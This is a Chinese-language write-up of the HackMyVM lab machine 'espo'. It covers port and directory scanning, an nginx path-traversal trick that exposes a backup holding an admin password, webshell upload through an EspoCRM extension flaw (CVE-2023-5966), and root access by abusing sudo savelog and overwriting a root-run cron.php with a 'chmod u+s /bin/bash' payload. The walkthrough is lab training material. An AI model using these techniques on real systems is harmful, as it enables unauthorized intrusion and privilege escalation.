---
sidebar_position: 6
tags: [Easy, Linux, nginx, 定时任务]
title: espo
description: espo
---
# espo
## 端口扫描
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# nmap -sTCV -p- --min-rate 1000 192.168.0.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 02:43 EDT
Nmap scan report for 192.168.0.102 (192.168.0.102)
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp open  http    nginx
|_http-title: EspoCRM
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:C8:C3:DB (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
```
## HTTP - 80
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416153448.png)
找了一圈, 相关的漏洞都需要先登陆网站才可以操作
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.102/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2480]
/admin                (Status: 301) [Size: 162] [--> http://192.168.0.102/admin/]
/portal               (Status: 301) [Size: 162] [--> http://192.168.0.102/portal/]
/install              (Status: 301) [Size: 162] [--> http://192.168.0.102/install/]
/client               (Status: 301) [Size: 162] [--> http://192.168.0.102/client/]
/api                  (Status: 301) [Size: 162] [--> http://192.168.0.102/api/]
/robots.txt           (Status: 200) [Size: 26]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
看了一圈什么漏洞都没有发现, 觉得是中间件相关的漏洞但是没有什么发现看了 WP提示后发现是 nginx 目录穿越漏洞
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://espo.hmv/admin../ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -x html,txt,php,bak,zip 
/admin                (Status: 301) [Size: 162] [--> http://espo.hmv/admin../admin/]
/_oldsite             (Status: 301) [Size: 162] [--> http://espo.hmv/admin../_oldsite/]
                                                                                                                                                               
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://espo.hmv/admin../_oldsite -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php,bak,zip 
/info                 (Status: 200) [Size: 540]
/backup.zip           (Status: 200) [Size: 37975754]
```
使用工具扫描之后可以发现其中有一个备份文件, 在其中可以获取到一个账号密码
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM/backup/data]
└─# cat config.php 
<?php

  'smtpUsername' => 'admin',
  'smtpPassword' => '39Ue4kcVJ#YpaAV24CNmbWU',
?>
```
在搜寻之后发现一个漏洞可以利用 [CVE-2023-5966](https://github.com/pedrojosenavasperez/cve-2023-5966/tree/main) 从扩展选项处进行上传文件, 之后点击安装就会写入一个 `webshell.php` 文件
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416154233.png)
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416154210.png)
随后获取一个反向 Shell
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416154343.png)
## 后渗透
### www-data --> mandie
查看 mandie 用户家目录下发现一个 copyPics 文件, 其中的作用是将 `/var/shared_medias` 目录下的文件进行分类存放, 这回涉及到命令执行的问题
```bash
(remote) www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2>/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2>/dev/null
    done
done
```
在代码中可以看到是会将 `/var/shared_medias` 下的所有非执行文件移动到 `/home/mandie` 目录下的, 所以可以直接将 `copyPics` 文件复制到 `/var/shared_medias` 之后添加反向 Shell 命令
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416164859.png)
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416164914.png)
### mandie --> root (第一种方式)
发现 mandie 用户具有 SUDO 权限, 可以执行一个 savelog 的 Shell 脚本, 使用 GPT 分析后认为可以使用这个脚本来生成 `/root/root.txt` 的日志文件
```bash
(remote) mandie@espo:/home/mandie$ sudo -l
sudo: unable to resolve host espo: Name or service not known
Matching Defaults entries for mandie on espo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mandie may run the following commands on espo:
    (ALL : ALL) NOPASSWD: /usr/bin/savelog
(remote) mandie@espo:/home/mandie$ file /usr/bin/savelog 
/usr/bin/savelog: POSIX shell script, ASCII text executable
```
如下操作
```bash
(remote) mandie@espo:/home/mandie$ sudo -u root /usr/bin/savelog -r /tmp /root/root.txt
sudo: unable to resolve host espo: Name or service not known
Rotated `/root/root.txt' at Tue Apr 16 02:05:07 PM CEST 2024.
(remote) mandie@espo:/home/mandie$ ls -al /tmp/root.txt.0 
-rwx------ 1 root root 33 Dec  4 15:42 /tmp/root.txt.0
(remote) mandie@espo:/home/mandie$ sudo -u root /usr/bin/savelog -u mandie /tmp/root.txt.0 
sudo: unable to resolve host espo: Name or service not known
Rotated `/tmp/root.txt.0' at Tue Apr 16 02:06:42 PM CEST 2024.
(remote) mandie@espo:/home/mandie$ ls -al /tmp/root.txt.0 
-rw-r--r-- 1 mandie root 0 Apr 16 14:06 /tmp/root.txt.0
(remote) mandie@espo:/home/mandie$
```
### www-data --> root(第二种方式: 直接提权)
上传 pspy 进行分析, 发现有一个 root 进程在执行 `cron.php` 文件, 并且这个 php 文件属于 `www-data` 用户
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416160955.png)
```bash
(remote) www-data@espo:/var/www/html$ ls -al cron.php 
-rw-r--r-- 1 www-data www-data 1531 Dec  4 15:42 cron.php
(remote) www-data@espo:/var/www/html$ cat cron.php 
<?php
include "bootstrap.php";

use Espo\Core\{
    Application,
    ApplicationRunners\Cron,
};

(new Application())->run(Cron::class);
```
所以我直接重写 `cron.php` 文件修改 `/bin/bash` 的权限
```php
<?php
	system('chmod u+s /bin/bash');
?>
```
### www-data --> mandie (扩展手段)
> 从 [HackMyVm : Espo](https://medium.com/@mrwhitecap/hackmyvm-espo-c2bb7f8af751) 学习到的手段属实长见识了

之前发现的脚本文件作用是将 `/var/shared_meidas` 下的非执行文件复制到 `/home/mandie` 下, 所以可以利用 `.forward` 文件来进行操作

![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416202843.png)